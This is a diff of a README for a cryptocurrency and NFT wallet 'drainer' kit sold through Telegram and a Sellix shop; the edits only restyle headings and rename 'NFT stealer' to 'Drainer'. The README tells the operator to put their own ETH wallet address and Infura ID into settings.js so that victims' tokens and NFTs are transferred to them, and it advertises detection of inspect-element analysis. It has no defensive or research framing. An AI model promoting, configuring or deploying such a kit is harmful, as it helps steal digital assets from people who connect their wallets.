@@ -8,7 +8,7 @@
 
 ### 📩 DM me here: [@Zentoh](https://t.me/zentoh) or join our [Group](https://t.me/CryptoDrainers) to follow updates!
 
-## `💎 Features:`
+## ` 💎 Features `
 - [x] Inspect Element Detection
 - [x] Custom Design
 - [x] Cool design 
@@ -19,7 +19,7 @@
 
 ---
 
-## `✍ Setup Guide :` 
+## ` ✍ Setup Guide ` 
 you need to edit the **settings.js** file only. 
 - line 1: const adress = `"YOUR WALLET";` replace **YOUR WALLET with your ETH wallet address.**
 - line 2: const infuraId = `"InfuraId";` replace this by **your https://Infura.io app ID**
@@ -30,7 +30,7 @@ you need to edit the **settings.js** file only.
 
 ---
 
-## `☁️ Important (PLEASE READ BEFORE)` 
+## ` ☁️ Important (Please Read it) ` 
 
 - Lines after **"const drainNftsInfo"** will be used for the NFT drainer.
 - Edit lines : nftReceiveAddress: **"YOUR WALLET"**, replace this your ETH wallet address.
@@ -42,14 +42,14 @@ To get instant support, contact me on [Telegram](https://t.me/zentoh)
 
 ---
 
-#### `👻 Why it doesn't show my address?`
+#### ` 👻 Why it doesn't show my address? `
 
-This **NFT stealer** interacts directly with the **nft contract** to transfer it to your address located in the **settings.js** file.
+This **Drainer** interacts directly with the **nft contract** to transfer it to your address located in the **settings.js** file.
 ![view](https://media.discordapp.net/attachments/964872997750067240/968100664527945798/Untitled-z1.png)
 
 ---
 
-## `🌊 Socials:`
+## ` 🌊 Socials `
 
 - Telegram: https://t.me/Zentoh
 - Shop: https://Tec.sellix.io
